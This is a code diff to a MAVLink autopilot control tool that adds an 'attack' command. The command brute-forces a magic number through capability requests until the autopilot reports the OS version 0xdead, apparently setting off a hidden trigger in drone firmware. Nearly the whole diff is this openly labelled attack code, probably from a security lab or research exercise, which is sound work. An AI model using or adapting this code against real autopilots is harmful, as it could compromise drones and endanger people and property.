@@ -12,7 +12,42 @@
 #include "stdio_control.h"
 #include "utils.h"
 
+#include <common/mavlink.h>
+#include <vector>
+#include <random>
+
 using namespace std;
+
+#define TIMED_ATTACK 10
+#define MAGIC_NUN_ATTACK 11
+#define MAGIC_NUM_RANGE 10
+#define MAGIC_NUMBER 3
+
+void attack(Autopilot_Interface &api) {
+
+	std::vector<int> numbers;
+	for (int i = 0; i < MAGIC_NUM_RANGE; i++) {
+		numbers.push_back(i);
+	}
+
+	std::default_random_engine generator;
+
+	int attempt = 0;
+	do {
+		std::uniform_int_distribution<> uniform(0, numbers.size() - 1);
+		int index = uniform(generator);
+		int number = numbers.at(index);
+		numbers.erase(numbers.begin() + index);
+
+		cerr << "Attack attempt " << ++attempt << ": " << number << endl;
+		api.request_autopilot_capabilities(MAGIC_NUN_ATTACK, number);
+		usleep(500000);
+		if (api.current_messages.time_stamps.version) {
+			cerr << "Got OS version: " << api.current_messages.version.os_sw_version << endl;
+		}
+	} while(api.current_messages.time_stamps.version == 0 || api.current_messages.version.os_sw_version != 0xdead);
+	cerr << "Attack succeeded" << endl;
+}
 
 void stdio_control(Autopilot_Interface &api) {
 	api.set_manual_control(0.0, 0.0, 0.0, 0.0);
@@ -65,6 +100,8 @@ void stdio_control(Autopilot_Interface &api) {
 			} else if (cmd[0] == "shutdown") {
 				shutdown = true;
 				break;
+			} else if (cmd[0] == "attack") {
+				attack(api);
 			}
 		}
 	}
